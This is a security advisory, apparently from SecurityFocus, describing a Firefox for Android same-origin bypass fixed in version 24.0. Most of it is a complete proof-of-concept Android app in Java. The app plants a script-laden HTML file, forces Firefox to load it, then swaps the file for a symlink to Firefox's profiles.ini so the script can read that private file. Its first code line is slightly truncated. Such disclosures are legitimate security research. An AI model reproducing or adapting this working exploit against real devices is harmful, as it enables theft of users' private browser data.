source: http://www.securityfocus.com/bid/62480/info

Mozilla Firefox is prone to a security-bypass vulnerability.

Attackers can exploit this issue to bypass the same-origin policy and certain access restrictions to access data, or execute arbitrary script code in the browser of an unsuspecting user in the context of another site. This could be used to steal sensitive information or launch other attacks.

Note: This issue was previously discussed in BID 62447 (Mozilla Firefox/Thunderbird/SeaMonkey MFSA 2013-76 through -92 Multiple Vulnerabilities), but has been moved to its own record to better document it.

This issue is fixed in Firefox 24.0. 

ckage jp.mbsd.terada.attackfirefox1;

  import android.net.Uri;
  import android.os.Bundle;
  import android.app.Activity;
  import android.content.Intent;

  public class MainActivity extends Activity {
      public final static String MY_PKG =
          "jp.mbsd.terada.attackfirefox1";

      public final static String MY_TMP_DIR =
          "/data/data/" + MY_PKG + "/tmp/";

      public final static String HTML_PATH =
          MY_TMP_DIR + "A" + Math.random() + ".html";

      public final static String TARGET_PKG =
          "org.mozilla.firefox";

      public final static String TARGET_FILE_PATH =
          "/data/data/" + TARGET_PKG + "/files/mozilla/profiles.ini";

      public final static String HTML =
          "<u>Wait a few seconds.</u>" +
          "<script>" +
          "function doit() {" +
          "    var xhr = new XMLHttpRequest;" +
          "    xhr.onload = function() {" +
          "        alert(xhr.responseText);" +
          "    };" +
          "    xhr.open('GET', document.URL);" +
          "    xhr.send(null);" +
          "}" +
          "setTimeout(doit, 8000);" +
          "</script>";

      @Override
      public void onCreate(Bundle savedInstanceState) {
          super.onCreate(savedInstanceState);
          setContentView(R.layout.activity_main);
          doit();
      }

      public void doit() {
          try {
              // create a malicious HTML
              cmdexec("mkdir " + MY_TMP_DIR);
              cmdexec("echo \"" + HTML + "\" > " + HTML_PATH);
              cmdexec("chmod -R 777 " + MY_TMP_DIR);

              Thread.sleep(1000);

              // force Firefox to load the malicious HTML
              invokeFirefox("file://" + HTML_PATH);

              Thread.sleep(4000);

              // replace the HTML with a symbolic link to profiles.ini
              cmdexec("rm " + HTML_PATH);
              cmdexec("ln -s " + TARGET_FILE_PATH + " " + HTML_PATH);
          }
          catch (Exception e) {}
      }

      public void invokeFirefox(String url) {
          Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
          intent.setClassName(TARGET_PKG, TARGET_PKG + ".App");
          startActivity(intent);
      }

      public void cmdexec(String cmd) {
          try {
              String[] tmp = new String[] {"/system/bin/sh", "-c", cmd};
              Runtime.getRuntime().exec(tmp);
          }
          catch (Exception e) {}
      }
  }
